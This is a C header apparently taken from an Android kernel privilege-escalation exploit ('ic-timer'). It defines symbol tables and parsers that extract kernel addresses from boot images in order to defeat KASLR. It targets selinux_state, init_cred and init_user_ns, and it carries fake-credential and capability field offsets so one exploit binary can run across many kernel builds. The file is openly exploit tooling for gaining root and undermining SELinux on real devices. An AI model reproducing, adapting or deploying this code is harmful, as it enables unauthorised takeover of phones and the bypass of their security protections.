#ifndef IC_SYMS_H
#define IC_SYMS_H

#include <stddef.h>
#include <stdint.h>

/*
 * Symbol-table support shared by `ic-timer slide` (runtime) and
 * `ic-timer syms` (build-time, on the phone).
 *
 * The exploit needs 66 link-time addresses: 62 scheduler/debug anchors used
 * to vote the KASLR slide from sched_blocked_reason, and four targets
 * (__tracepoint_sys_exit, selinux_state, init_user_ns, init_cred).  The
 * addresses depend on the kernel build (link order), not just the kernel
 * version.  The built-in table is only valid for
 * 6.1.145-android14-11-gf506252fa70d; every other build must supply a table
 * produced from its own kernel image.
 *
 * A table file is text:
 *
 *   # build=6.1.145-android14-11-gf506252fa70d
 *   # version=Linux version 6.1.145-... (builder@host) ...
 *   __tracepoint_sys_exit=0xffffffc00a2d1860
 *   ...
 *
 * `ic_syms_parse_file` accepts one of:
 *   - Android boot.img (v0-v4), kernel lz4-legacy / gzip / raw ARM64 Image
 *   - raw ARM64 Image (or compressed kernel blob)
 *   - vmlinux ELF (uses .symtab directly)
 *   - System.map / ksyms.txt text (`addr [type] name` or `name=addr`)
 */

#define IC_SYMS_MAX 160
#define IC_SYMS_NAME_MAX 96

struct ic_sym_entry {
        char name[IC_SYMS_NAME_MAX];
        uint64_t addr;
};

/* Required symbol names, NULL-terminated.  Four of them are targets; the
 * rest are voting anchors. */
extern const char *const ic_syms_required[];
extern const int ic_syms_required_n;
#define IC_SYMS_NTARGET 4

/* Parse `in_path` and write a table to `out_path`.
 * Returns 0 on success, -1 on error.  Prints progress to stderr when
 * `verbose` is non-zero. */
int ic_syms_parse_file(const char *in_path, const char *out_path, int verbose);

/* Load a table file.  Fills `tab` (capacity `cap`) and returns the number of
 * entries, or -1.  `build` / `version` receive the header values (possibly
 * empty). */
int ic_syms_load_file(const char *path, struct ic_sym_entry *tab, int cap,
                      char *build, size_t buildlen,
                      char *version, size_t versionlen);

/* Return non-zero if `name` is one of the required symbols. */
int ic_syms_is_required(const char *name);

/* ---- dynamic profile geometry ---------------------------------------------
 *
 * A "profile" used to be a compile-time block in profiles.h: one binary per
 * kernel build.  The extended ic-syms table can carry the same numbers as
 * `off.<name>=0xVALUE` lines (emitted by the GhostLock extractor from the
 * image's BTF, or hand-written), so one generic binary can run against any
 * kernel whose table was parsed from its boot image.  Every consumer falls
 * back to its compiled profile constant when a field is 0 (absent).
 *
 * The `essential` set is what a foreign kernel cannot run without:
 * the three allocation signatures the trace scans match on, the fake-cred
 * field offsets, and the vr.ko tracepoint->funcs offset.  The remaining
 * keys are optional refinements. */
struct ic_geo {
        char build[192];         /* "# build=" banner, when present */
        uint64_t timer_alloc;    /* sizeof(struct k_itimer) */
        uint64_t cred_req;       /* sizeof(struct cred) */
        uint64_t cred_alloc;     /* cred slab bucket (optional) */
        uint64_t task_alloc_bytes; /* sizeof(struct task_struct) */
        uint64_t task_cred;      /* offsetof(task_struct, cred) */
        uint64_t cred_uid;       /* offsetof(struct cred, uid) */
        uint64_t cap_inh, cap_perm, cap_eff, cap_bset, cap_amb;
        uint64_t cred_security, cred_user, cred_user_ns;
        uint64_t cred_ucounts, cred_group_info;
        uint64_t tp_funcs;       /* offsetof(struct tracepoint, funcs) */
        uint64_t timer_node_off;         /* optional: offsetof(k_itimer, node) */
        uint64_t timer_site_low21;      /* optional: pre-seed/validation */
        uint64_t copy_process_low21;    /* optional */
        uint64_t fullcap;               /* optional */
        uint64_t selinux_blob_off;      /* optional */
        uint64_t selinux_sid_kernel;    /* optional */
        int keys;      /* total off.* keys recognized */
        int essential; /* how many of the IC_GEOM_ESSENTIAL keys were seen */
};

#define IC_GEOM_ESSENTIAL 16

/* Parse the `off.*` keys and the "# build=" banner of a table file.
 * Returns the number of keys recognized (0 when the table carries no
 * geometry), or -1 when the file cannot be opened.  Unknown off.* names are
 * ignored; malformed lines are skipped. */
int ic_geo_load(const char *path, struct ic_geo *out);

/* Extract the kernel release from a "Linux version ..." banner inside an
 * image.  Returns 1 on success. */
int ic_syms_banner_release(const unsigned char *img, size_t len,
                           char *out, size_t outlen);

#endif /* IC_SYMS_H */
